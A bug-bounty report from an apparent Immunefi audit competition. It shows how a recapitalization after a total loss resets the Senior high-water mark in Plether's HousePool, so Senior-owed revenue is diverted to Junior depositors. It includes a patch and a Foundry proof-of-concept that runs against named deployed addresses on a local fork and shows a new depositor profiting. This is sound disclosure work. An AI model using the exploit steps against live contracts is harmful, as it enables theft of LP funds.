# \#98268 [SC-Low] Post-wipe recap overwrites the kept Senior HWM in `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent()`, handing Senior-owed LP revenue to Junior

**Submitted on Nov 6th 2026 at 15:10:56 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98268
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

# Brief/Intro

After a terminal loss wipes both tranche principals, `absorbLoss()` keeps the Senior high-water mark (HWM) so later LP revenue restores Senior first. The owner's documented recovery call, `CfdEngine.recapitalizePool(R)`, is applied through the empty-bootstrap branch of `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent()`, which overwrites that HWM with `R`. With `R` below the kept HWM, the LP revenue the waterfall owes Senior is credited to Junior, and because Senior now reads as restored, the Junior tranche reopens to any new depositor, who takes that revenue. On a fork of the Arbitrum Sepolia v2.0.0 deployment, a recap of the runbook size erases 3,744,347.38 USDG of Senior entitlement. A fresh depositor enters with 20M USDG, takes 98% of the next revenue event, and redeems a 183,190.65 USDG profit, with a total gain of 352,506.83 USDG. Impact: High, "Theft of unclaimed yield".

## Vulnerability Details

**Root cause**

1. A loss keeps the Senior HWM through a total wipe. `absorbLoss()` charges Junior first, then Senior, down to zero, and leaves the HWM "deliberately unchanged so future revenue continues to restore senior impairment" ([HousePoolWaterfallAccountingLib.sol#L161-L184](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L161-L184)).
2. The recap's bootstrap branch overwrites it. With Senior shares and both principals at zero, the stored HWM is not an input ([HousePoolPendingPreviewLib.sol#L118-L122](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L118-L122)):

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
```

   Every other waterfall HWM writer only raises it or scales it with principal (#L123-L132; HousePoolWaterfallAccountingLib.sol#L80-L89, #L119-L131, #L147-L156).
3. The branch runs on the first reconcile after the recap. `recapitalizePool()` ([CfdEngine.sol#L632-L655](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L655)) queues the amount (`HousePool.recordClaimantInflow()`, HousePool.sol#L624-L655). The next `_reconcile()` (HousePool.sol#L1555-L1599) reserves the settleable recap (#L1829-L1834). With both principals at zero, `planReconcile()` seeds Senior only from LP value outside that recap ([HousePoolReconcilePlanLib.sol#L76-L81](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L76-L81)). When that value is zero, `_applyPendingClaimantBucketsLive()` (HousePool.sol#L1759-L1776) reaches the bootstrap branch.
4. After the reset `S == HWM`, so `distributeRevenue()` restores nothing and credits every later USDG of revenue to Junior principal (HousePoolWaterfallAccountingLib.sol#L147-L158). Revenue queued while both principals are zero (HousePool.sol#L646-L647) follows the same path in the recap's own reconcile, through the MED-12 continuation (HousePoolPendingPreviewLib.sol#L46-L56).
5. The reset reopens the tranches. The deposit gate compares projected Senior principal with the projected HWM (HousePoolTrancheGateLib.sol#L36, HousePool.sol#L1120-L1137), and once revenue makes Junior principal nonzero Junior no longer counts as wiped (TrancheVault.sol#L1319, #L1639-L1641). A new Junior LP enters at the post-wipe price; with the HWM kept, both tranches stay closed and the revenue goes to Senior.
6. Nothing restores the erased amount: no setter writes the HWM, and a later recap fills only `HWM - S = 0` and is parked in `unassignedAssets` (HousePoolPendingPreviewLib.sol#L123-L136).

**Why this breaks the documented design.** The HWM is "the Senior entitlement that future revenue must restore after a loss"; "Losses do not reduce the Senior high-water mark"; "Route surplus first to restore Senior principal to its high-water mark, then to Junior" ([ACCOUNTING_SPEC.md lines 332-338](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md); WHITEPAPER §4.1 rules 3-5; SECURITY.md invariant "Senior impairment must be restored before junior extracts surplus", line 394). A recap is "intended to restore waterfall claimants" and goes "to senior restoration or unassigned assets" (ACCOUNTING_SPEC.md lines 634, 642-643); the LOW-22 reply that added `recapitalizePool()` promises "existing senior-recovery priority". The NatSpec (#L104-L105) and repo tests state the `max(target, amount)` formula; they describe the code, not the waterfall rules it breaks.

**Why this is not a design choice: the outcome flips on one atom.** In the PoC control, the loss is one atom smaller and leaves 0.000001 USDG of LP equity. The same 35,868,255.68 USDG recap then takes the gap branch: the HWM stays at 39,612,603.05 and the next revenue restores Senior. In the claim run, the recap resets the HWM to 35,868,255.68 and erases 3,744,347.38 USDG of Senior entitlement (table under Impact Details). A deliberate rule would not move 3.7M USDG of Senior entitlement on a one-atom difference in the size of the loss.

**Pre-conditions**

1. A terminal loss consumes all LP capital while Senior shares exist (LP equity at the mark ≤ 0). The protocol plans for this state: it built `recapitalizePool()` and the "Explicit terminal-deficit cascade" runbook for "actual negative terminal LP equity" (SECURITY.md lines 155-162 and 1499-1511), and `absorbLoss()` deliberately keeps the HWM through it. Trading inside the release bounds reaches it only through extreme moves, because admission keeps `E >= L + B` and the worst-case payout `L` is measured at price 0 or the 2.00 cap. The PoC models the loss as a USDG shortfall at the pool, the way the repo's own wipeout tests do (TrancheRecoveryBehavior.t.sol#L69-L71); USDG is out of scope and may be mocked (scope page). In a trading wipe a close latches degraded mode, which blocks `settleLpEpoch()` (HousePool.sol#L1864-L1870) until the owner recaps and calls `clearDegradedMode()`; the next settlement then applies the loss and the recap in one `_reconcile()`. `planReconcile()` absorbs the loss to `S = J = 0` and writes it (HousePool.sol#L1584-L1585) before `_applyPendingClaimantBucketsLive()` runs (#L1598), so the same bootstrap branch overwrites the HWM. This is feasibility, which "do[es] not change the impact or severity of a finding, only the amount paid for it" (scope page).
2. At the reconcile that applies the recap, LP equity outside the queued recap is zero (the PoC: the loss equals LP equity at the mark). With a larger loss (deficit `D`), the same branch sets the HWM to the full recap `R` and Senior to `R - D`. The next revenue refills `D` and the rest goes to Junior; the queued `D` then has no gap left and is parked in `unassignedAssets`, which closes tranche deposits (HousePoolTrancheGateLib.sol#L28-L34) until the owner assigns it. The HWM is lowered either way, and existing Junior holders receive the Senior-owed revenue either way; a new depositor's entry needs the zero-equity state or that later assignment.
3. The owner recapitalizes with `R` below the kept HWM `H0`. The runbook sets no recap amount. Its only quantitative step is "Clear degraded mode only after raw solvency `E >= L` is genuinely restored" (SECURITY.md line 1510), which `clearDegradedMode()` enforces (CfdEngine.sol#L662). The PoC uses the smallest recap meeting it, `R = L - E`, which is below `H0` whenever Senior is larger than the open book's maximum liability (the release Senior cap is 40M USDG).
4. Each reconcile is an LP epoch settlement through the permissionless `OrderRouter.settleLpEpoch()`, with one matured LP request (here Junior LPs' exits, eve's deposit and eve's redemption).

PoC environment (all out of scope): Pyth's code is replaced by the repo's `MockPyth`, seeded with the real stored prices and fee. The 1% basket moves are Pyth updates. USDG reaches the LPs and the owner via `deal`, and the terminal loss is a `deal` that lowers the pool's USDG balance. `ArbSys.arbBlockNumber()` follows `vm.roll`. The owner is pranked only for the documented `recapitalizePool()` call. No in-scope contract is modified or mocked.

**Not a known issue**

- Cecuro MED-12 (Acknowledged; plether-ai-audit-report-2026-10-26.pdf, "Mixed recovery inflows can strand LP revenue in ownerless pool assets") is about the continuation flag being computed before the recap, which parked same-batch revenue in `unassignedAssets`. Its fix (HousePoolPendingPreviewLib.sol#L50-L52) is correct when the HWM is kept: the continuing revenue then restores Senior. MED-12's example gives no pre-wipe HWM, so its stated result (Senior 40,000, Junior 15,000) holds only if that HWM was at most 40,000; above it, the documented rules route the 15,000 to Senior ("Route surplus first to restore Senior principal to its high-water mark", ACCOUNTING_SPEC.md line 338), and the same reply says "Recapitalization remains senior-first". The root cause here is the HWM write at #L120-L121, which MED-12 does not report.
- Cecuro LOW-22 (Addressed; "Governance cannot use the documented non-dilutive recapitalization path") reported that no entry point existed for the Recapitalization inflow. Its fix added `CfdEngine.recapitalizePool()`, which is what makes this branch reachable. Its own reply promises "existing senior-recovery priority", which the reset breaks. Per the scope page, a report on a fixed root cause is valid if "the fix ... introduces a new bug"; this is a different root cause either way.

## Impact Details

**Selected impact:** Theft of unclaimed yield

Severity: **High**. LP trading revenue that the waterfall owes Senior, earned by the pool but not yet credited to any tranche, is credited to Junior instead. A new Junior depositor with no prior stake takes most of it and redeems it as USDG.

From the PoC (fork block 326368388; USDG):

| | Claim: the loss takes all LP equity | Control: the loss leaves 1 atom |
|---|---|---|
| Senior HWM kept by the loss (`H0`) | 39,612,603.05 | 39,612,603.05 |
| Owner recap `R = L - E` | 35,868,255.68 | 35,868,255.68 |
| After the recap: Senior / HWM | 35,868,255.68 / **35,868,255.68** | 35,868,255.68 / 39,612,603.05 |
| Revenue 1 (360,133.25): Senior / Junior | 35,868,255.68 / **360,133.25** | 36,228,388.92 / 0 |
| Junior deposits open / eve can enter | **yes / yes** | no / no |
| Revenue 2 (359,509.43) | **to Junior**; Senior 35,868,910.81 after it (coupon only) | — |

- Erased Senior entitlement: `H0 - R` = 3,744,347.38 USDG. Up to that amount, LP revenue owed to Senior goes to Junior. In the PoC, 719,315.11 USDG across two 1% FX moves.
- The new depositor (eve, any address, own USDG) deposits 20,000,000 USDG after the reset and holds 98.2% of Junior. She redeems 52% of her shares (cost 10,393,594.50) for 10,576,785.15 USDG, a realized profit of 183,190.65. Her total gain, including the remaining shares, is 352,506.83 USDG, all of it revenue that the control routes to Senior. Only free cash and the Junior covenant, now protecting `R` instead of `H0` (HousePoolSeniorCapacityLib.sol#L64-L90), limit her exit. This is not a return the protocol offers new Junior capital: with the HWM kept she cannot enter at all (control), and the revenue she takes is Senior's unpaid restoration.
- The victims are the Senior LPs; the new Senior LP's pro-rata claim is 34,861,775.66 after both revenue events, and with the HWM kept that revenue restores Senior first.
- It repeats until `H0 - R` is used up; nothing restores the erased HWM.

Downgrade criteria: the depositor profits, so the Griefing standard does not apply; the trigger is "a logic error that a privileged address can trigger, which remains valid" and grants no privilege; "Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it"; "The existence of monitoring or pause functionality alone does not justify a downgrade". This is not "Contract fails to deliver promised returns, but doesn't lose value" (Low): the revenue is not lost or withheld; it is credited to Junior and withdrawn as USDG by a depositor who had no claim to it. Recapping at least `H0` avoids the harm, but the runbook sizes the recap to `E >= L`, so that is a mitigation that "would require unconventional action".

## Recommendation

Keep the larger of the stored HWM and the bootstrap target in the empty-bootstrap branch, so a recap can raise the Senior entitlement but never lower the one `absorbLoss()` kept:
```diff
diff --git a/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol b/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol
index ce85967b..be65cedf 100644
--- a/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol
+++ b/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol
@@ -101,9 +101,9 @@ library HousePoolPendingPreviewLib {
     }
 
     /// @notice Routes recapitalization to senior restoration or to unassigned assets.
-    /// @dev With senior owners and zero claimed principal, all `amount` bootstraps senior principal and sets the
-    ///      high-water mark to `max(recapitalizationTargetAssets, amount)`. Otherwise, senior principal is restored only
-    ///      up to its high-water mark. Any remainder, including all value when there are no senior owners, becomes
+    /// @dev With senior owners and zero claimed principal, all `amount` bootstraps senior principal and raises the
+    ///      high-water mark to `max(recapitalizationTargetAssets, amount)`; a larger high-water mark kept through a
+    ///      total loss is preserved. Otherwise, senior principal is restored only up to its high-water mark. Any remainder, including all value when there are no senior owners, becomes
     ///      unassigned; recapitalization never accrues to junior principal. Mutates `state` in place.
     /// @param state In-memory accounting state to update.
     /// @param amount Settleable recapitalization assets to apply.
@@ -117,8 +117,12 @@ library HousePoolPendingPreviewLib {
         if (state.seniorSupply > 0) {
             if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
                 state.waterfall.seniorPrincipal += remaining;
-                state.waterfall.seniorHighWaterMark =
+                uint256 bootstrapHighWaterMark =
                     recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
+                // A total wipe keeps the Senior entitlement (absorbLoss); a recap may raise it but never lower it.
+                if (bootstrapHighWaterMark > state.waterfall.seniorHighWaterMark) {
+                    state.waterfall.seniorHighWaterMark = bootstrapHighWaterMark;
+                }
                 remaining = 0;
             } else {
                 uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
```

With the fix, the claim run behaves like the control. The HWM stays at 39,612,603.05, revenue restores Senior first, and the Junior tranche stays closed while Senior is impaired, so no new depositor can enter. The PoC then fails at its first damage assert ("recap overwrote the Senior HWM with the recap amount: 39612603053670 != 35868255677298"), and the control still passes. The fix was checked by swapping the locally compiled `HousePool` (the library is internal and inlined) in at the deployed address in a separate test. A first bootstrap (stored HWM 0) and a recap at or above the kept HWM behave as before. Four repo tests assert the reset value itself and need new expected values: `test_PostWipeoutRequiresExplicitRecapForHwmReset` and `test_SeniorRequiresExplicitRecapAfterFullWipeout` (TrancheRecoveryBehavior.t.sol), `test_RecordRecapitalizationInflow_SeedsSeniorWhenNoPrincipalButSeedSharesExist` (HousePoolBootstrap.t.sol) and `test_MaxDepositAndMaxMint_ReopenForPendingSeniorRecapAfterWipeout` (HousePoolSeededSetup.t.sol). `HousePool.assignUnassignedAssets()` also writes `HWM = amount` when Senior principal is zero (HousePool.sol#L691-L693), but it mints new Senior shares to a receiver and Senior deposit capacity is zero while Junior principal is zero (HousePool.sol#L678), so it is a different path and not covered by this fix.

## References

- Contest commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8

## Proof of Concept

## Proof of Concept

### Attack path

1. A new Senior LP requests a 38,500,000 USDG deposit and three Junior LPs (jill, joe, kim) 10,000 each; the next LP epoch settles them. Senior HWM == principal. (`// Step 1`)
2. The USD strengthens 1% against the basket (Pyth update + mark refresh), so the fork's open traders are in profit. Junior LP jill requests her exit. (`// Step 2`)
3. Terminal loss: the pool loses USDG equal to LP equity at the mark (140,367,142.65). (`// Step 3`)
4. The next permissionless LP settlement absorbs it: Senior = Junior = 0, HWM kept at 39,612,603.05. (`// Step 4`)
5. The owner calls the documented `CfdEngine.recapitalizePool(R)` with the runbook amount `R = L - E` = 35,868,255.68. Junior LP joe requests his exit. (`// Step 5`)
6. The next LP settlement applies the recap: Senior = HWM = 35,868,255.68. (`// Step 6`)
7. The move reverses (traders give back their profit). The Junior gate is open; eve, a fresh address with her own USDG, requests a 20,000,000 Junior deposit. (`// Step 7`)
8. The next LP settlement books revenue 360,133.25, all to Junior, then activates eve's deposit at the post-wipe Junior price (98.2% of Junior). (`// Step 8`)
9. After the 1 h activation cooldown the USD weakens 1% (traders lose again). eve requests a redemption sized to the Junior funding cap. (`// Step 9`)
10. The next LP settlement books revenue 359,509.43 to Junior (Senior +655 coupon) and funds eve's redemption; she claims 10,576,785.15 USDG for shares that cost 10,393,594.50. (`// Step 10`)

Control (`test_F019_control`): one atom of LP equity left by the loss; the recap keeps the HWM, revenue 1 restores Senior, Junior gets 0, eve cannot enter.

Add the test at the path shown in the command, then run:
```bash
# Repository at commit a82d4fef; `git submodule update --init --recursive` first.
# Run from packages/perps/ (its foundry.toml); add the test at test/F019_SeniorHWMOverwrittenOnPostWipe.t.sol.
# Tested with forge Version: 1.8.7.
# Local fork of Arbitrum Sepolia (chain id 421614) at block 326368388, Plether Perps v2.0.0 (USDG).
# Read-only RPC; nothing is sent to the public network. The RPC must be an ARCHIVE node: public endpoints prune the state of older blocks.
ARB_SEPOLIA_RPC_URL=<arbitrum-sepolia-archive-rpc-url> forge test --match-path test/F019_SeniorHWMOverwrittenOnPostWipe.t.sol --match-test test_F019_poc -vvv

# Same test against a local Anvil fork:
anvil --fork-url <arbitrum-sepolia-archive-rpc-url> --fork-block-number 326368388 --chain-id 421614 &
ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F019_SeniorHWMOverwrittenOnPostWipe.t.sol --match-test test_F019_poc -vvv
```
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Senior HWM overwritten on post-wipe recapitalization in `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent()` lets a partial owner recap hand Senior restoration revenue to Junior
// Chain: Arbitrum Sepolia (chain id 421614), Plether Perps v2.0.0 (USDG). Addresses: deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env.
// Run: ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F019_SeniorHWMOverwrittenOnPostWipe.t.sol --match-test test_F019_poc -vvv
//   or against a local Anvil fork: anvil --fork-url <archive rpc url> --fork-block-number <FORK_BLOCK> &
//                                  ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F019_SeniorHWMOverwrittenOnPostWipe.t.sol ...
// LOCAL FORK ONLY (Immunefi PoC rules): the RPC is read-only. Never vm.broadcast, cast send or --broadcast:
// a transaction on mainnet or a public testnet means an immediate, permanent Immunefi ban.

import {Test, console} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ICfdEngineProtocolLens} from "@plether/perps/interfaces/ICfdEngineProtocolLens.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Public HousePool getters used by the PoC (state variables are not all on IHousePool).
interface IHousePoolF019 {
    function seniorPrincipal() external view returns (uint256);
    function juniorPrincipal() external view returns (uint256);
    function seniorHighWaterMark() external view returns (uint256);
    function unassignedAssets() external view returns (uint256);
    function pendingRecapitalizationAssets() external view returns (uint256);
    function pendingTradingRevenueAssets() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function owner() external view returns (address);
    function seniorVault() external view returns (address);
    function juniorVault() external view returns (address);
    function ENGINE_PROTOCOL_LENS() external view returns (address);
    function getSeniorDepositCapacity() external view returns (uint256);
    function markStalenessLimit() external view returns (uint256);
    function lpEpochStart(uint256 epochId) external view returns (uint256);
    function canAcceptTrancheDeposits(bool isSenior) external view returns (bool);
    function getPendingTrancheState()
        external
        view
        returns (uint256 seniorPrincipalAssets, uint256 juniorPrincipalAssets, uint256 maxSeniorWithdraw, uint256 maxJuniorWithdraw);
}

interface IEngineF019 {
    function owner() external view returns (address);
    function degradedMode() external view returns (bool);
    function totalTraderClaimBalanceAssets() external view returns (uint256);
    function sides(uint256 index)
        external
        view
        returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
    function recapitalizePool(uint256 amountAssets) external;
}

interface IRouterF019 {
    function pletherOracle() external view returns (address);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
    function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;
}

interface ITrancheVaultF019 {
    function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function redeem(uint256 shares, address receiver, address controller) external returns (uint256 assets);
    function maxRedeem(address controller) external view returns (uint256);
    function maxRequestDeposit(address controller) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function depositQueueHead() external view returns (uint256);
    function redeemQueueHead() external view returns (uint256);
}

interface IOracleF019 {
    function pyth() external view returns (address);
    function isOracleFrozen() external view returns (bool);
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function inversions(uint256 index) external view returns (bool);
    function housePool() external view returns (address);
}

interface IPythFeeF019 {
    function singleUpdateFeeInWei() external view returns (uint256);
}

interface IArbSysBlockF019 {
    function arbBlockNumber() external view returns (uint256);
}

contract F019_SeniorHWMOverwrittenOnPostWipe is Test {
    // Pinned Arbitrum Sepolia block (2026-11-05 17:42:16 UTC, a Thursday: FX market open), after deployment block 323658447.
    uint256 internal constant FORK_BLOCK = 326368388;

    // Deployed v2.0.0 addresses (addresses.env). Deployed from 1209ca8a; packages/perps/src is identical at scope a82d4fef.
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address internal constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B; // PERPS_OWNER (engine + pool owner)
    // Pyth contract the deployed oracle reads (out of scope; replaced below by the repo's own MockPyth).
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    // A new Senior LP within the release Senior cap (40M USDG, scope page) and the live capacity (checked in setUp).
    uint256 internal constant SENIOR_DEPOSIT = 38_500_000e6;
    // Ordinary Junior LPs; their exit requests are the matured LP work each settlement processes.
    uint256 internal constant JUNIOR_DEPOSIT = 10_000e6;
    // The fresh Junior LP who enters after the reset (any address, own USDG).
    uint256 internal constant EVE_DEPOSIT = 20_000_000e6;
    // Basket moves (bps of the real stored price at FORK_BLOCK): USD +1% (traders in profit), back to the stored price,
    // then USD -1% (traders give back more). Each step is a 1% FX move.
    uint256 internal constant USD_UP = 9_900;
    uint256 internal constant BASE = 10_000;
    uint256 internal constant USD_DOWN = 10_100;

    IHousePoolF019 internal pool = IHousePoolF019(POOL);
    IEngineF019 internal engine = IEngineF019(ENGINE);
    IRouterF019 internal router = IRouterF019(ROUTER);
    ITrancheVaultF019 internal senior = ITrancheVaultF019(SENIOR_VAULT);
    ITrancheVaultF019 internal junior = ITrancheVaultF019(JUNIOR_VAULT);
    MockPyth internal pyth = MockPyth(PYTH);

    address internal sam = makeAddr("sam"); // new Senior LP (38.5M): the victim cohort
    address internal jill = makeAddr("jill"); // Junior LP, exit request settled at step 4
    address internal joe = makeAddr("joe"); // Junior LP, exit request settled at step 6
    address internal kim = makeAddr("kim"); // Junior LP, exit request is the LP work at step 8 when eve cannot enter
    address internal eve = makeAddr("eve"); // fresh Junior LP after the reset: unprivileged, own USDG
    address internal keeper = makeAddr("keeper"); // any LP-epoch settler (permissionless Router path)
    address internal refresher = makeAddr("refresher"); // any mark refresher (e.g. the oracle worker)

    bytes32[] internal feedIds;
    bool[] internal inverted;
    PythStructs.Price[] internal storedAtFork;
    uint256 internal pythFee;
    uint256 internal l2Height = FORK_BLOCK;

    struct Run {
        uint256 hwmBeforeLoss;
        uint256 lpEquityAtLoss;
        uint256 lossAssets;
        uint256 seniorAfterLoss;
        uint256 juniorAfterLoss;
        uint256 hwmAfterLoss;
        uint256 solvencyBeforeRecap;
        uint256 maxLiability;
        uint256 recap;
        uint256 seniorAfterRecap;
        uint256 juniorAfterRecap;
        uint256 hwmAfterRecap;
        uint256 pendingRecapAfterRecap;
        uint256 revenue1;
        uint256 seniorAfterRevenue1;
        uint256 juniorAfterRevenue1;
        uint256 hwmAfterRevenue1;
        bool juniorOpenAfterRecap;
        uint256 eveMaxRequest;
        uint256 eveShares;
        uint256 juniorSupplyAtEntry;
        uint256 revenue2;
        uint256 seniorAfterRevenue2;
        uint256 juniorAfterRevenue2;
        uint256 seniorAfterSettle2;
        uint256 eveRedeemShares;
        uint256 eveRedeemCost;
        uint256 eveUsdgOut;
        uint256 eveRemainingValue;
        uint256 samShares;
        uint256 seniorSupply;
    }

    // virtual: the never-submitted fix-check test (`finding.py poc F-019 --fix-test`) extends this setUp.
    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");

        // Drift guard: the live deployment state this PoC relies on.
        assertEq(router.pletherOracle(), ORACLE, "router oracle drifted");
        assertEq(IOracleF019(ORACLE).housePool(), POOL, "oracle pool drifted");
        assertEq(IOracleF019(ORACLE).pyth(), PYTH, "oracle Pyth drifted");
        assertEq(pool.seniorVault(), SENIOR_VAULT, "senior vault drifted");
        assertEq(pool.juniorVault(), JUNIOR_VAULT, "junior vault drifted");
        assertEq(pool.owner(), OWNER, "pool owner drifted");
        assertEq(engine.owner(), OWNER, "engine owner drifted");
        assertFalse(IOracleF019(ORACLE).isOracleFrozen(), "fork block must be a live (unfrozen) market");
        assertFalse(engine.degradedMode(), "engine not degraded at the fork");
        assertGt(pool.seniorPrincipal(), 0, "live Senior principal");
        assertGt(pool.juniorPrincipal(), 0, "live Junior principal");
        assertEq(pool.seniorHighWaterMark(), pool.seniorPrincipal(), "Senior not impaired at the fork");
        assertEq(pool.unassignedAssets(), 0, "no unassigned assets at the fork");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "no queued recap at the fork");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "no queued revenue at the fork");
        assertEq(senior.depositQueueHead() + senior.redeemQueueHead(), 0, "senior LP queues empty");
        assertEq(junior.depositQueueHead() + junior.redeemQueueHead(), 0, "junior LP queues empty");
        assertGt(junior.totalSupply(), 0, "Junior shares exist");
        assertGe(pool.getSeniorDepositCapacity(), SENIOR_DEPOSIT, "Senior capacity for the new LP");
        assertEq(pool.markStalenessLimit(), 60, "pool mark staleness drifted");
        for (uint256 i; i < 6; ++i) {
            feedIds.push(IOracleF019(ORACLE).pythFeedIds(i));
            inverted.push(IOracleF019(ORACLE).inversions(i));
        }
        // Every in-scope contract runs as DEPLOYED at FORK_BLOCK; the PoC never replaces or edits in-scope code.

        // Pyth is out of scope: replace its code with the repo's MockPyth. Storage starts from the REAL stored prices
        // at FORK_BLOCK. The real deployment quotes a zero update fee; keep it.
        pythFee = IPythFeeF019(PYTH).singleUpdateFeeInWei();
        for (uint256 i; i < 6; ++i) {
            storedAtFork.push(IPyth(PYTH).getPriceUnsafe(feedIds[i]));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0)); // MockPyth scalar slots only
        }
        pyth.setFee(pythFee);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            pyth.setPrice(feedIds[i], p.price, p.conf, p.expo, p.publishTime);
        }
        vm.deal(keeper, 1 ether);
        vm.deal(refresher, 1 ether);
    }

    /// The claim, against live state at FORK_BLOCK. Must FAIL once the mitigation is applied.
    function test_F019_poc() public {
        Run memory r = _scenario(false);

        // Damage 1: the recap replaced the Senior HWM that the loss had kept with the recap amount.
        assertEq(r.hwmAfterRecap, r.recap, "recap overwrote the Senior HWM with the recap amount");
        assertLt(r.hwmAfterRecap, r.hwmAfterLoss, "Senior restoration entitlement erased by the recap");

        // Damage 2: the next LP revenue, owed to Senior up to the kept HWM, went to Junior.
        assertEq(r.seniorAfterRevenue1, r.recap, "Senior stopped at the recap amount, far below the kept HWM");
        assertGt(r.juniorAfterRevenue1, 0, "post-recap LP revenue owed to Senior was credited to Junior");

        // Damage 3: because Senior now reads as restored (S == HWM), the Junior gate reopened and a fresh,
        // unprivileged depositor entered the tranche that captures Senior's restoration revenue.
        assertTrue(r.juniorOpenAfterRecap, "Junior deposits reopened by the lowered HWM");
        assertGt(r.eveShares, 0, "fresh Junior depositor admitted after the reset");

        // Damage 4: the next LP revenue went to Junior again (Senior unchanged), and eve redeemed part of it as USDG.
        assertGt(r.revenue2, 0, "second LP revenue booked");
        assertLt(
            r.seniorAfterSettle2 - r.seniorAfterRevenue1, r.revenue2 / 100, "Senior received none of the second revenue"
        );
        assertGt(r.juniorAfterRevenue2, r.juniorAfterRevenue1 + EVE_DEPOSIT, "second revenue credited to Junior");
        assertGt(r.eveUsdgOut, r.eveRedeemCost, "fresh Junior depositor redeemed Senior-owed revenue as USDG");

        _log(r);
        int256 eveRealized = int256(r.eveUsdgOut) - int256(r.eveRedeemCost);
        int256 eveTotal = int256(r.eveUsdgOut + r.eveRemainingValue) - int256(EVE_DEPOSIT);
        console.log("Senior HWM erased by the recap (H0 - R)", r.hwmAfterLoss - r.hwmAfterRecap);
        console.log("eve realized profit on the redeemed shares (USDG 1e6)", uint256(eveRealized));
        console.log("eve total gain: USDG out + remaining share value - deposit (USDG 1e6)", uint256(eveTotal));
        console.log(
            "Senior-owed revenue credited to Junior (rev1 + rev2)",
            r.juniorAfterRevenue2 - EVE_DEPOSIT - r.juniorAfterRecap
        );
        console.log("Senior principal after settlement 2 (coupon only)", r.seniorAfterSettle2);
        console.log(
            "sam's pro-rata Senior claim after both revenues", r.seniorAfterRevenue2 * r.samShares / r.seniorSupply
        );
    }

